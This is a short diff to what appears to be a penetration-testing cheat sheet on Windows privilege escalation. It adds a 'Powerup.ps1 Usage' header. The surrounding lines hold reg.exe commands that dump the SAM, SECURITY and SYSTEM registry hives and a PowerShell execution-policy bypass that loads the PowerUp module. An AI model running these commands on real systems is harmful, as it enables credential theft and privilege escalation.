@@ -31,6 +31,7 @@ reg.exe save hklm\sam c:\sam_backup
 reg.exe save hklm\security c:\security_backup
 reg.exe save hklm\system c:\system
 
+[Powerup.ps1 Usage]
 Manual Powershell Priv esc powerup.ps1
 powershell -nop -exec bypass
 Import-Module .\powerup.ps1
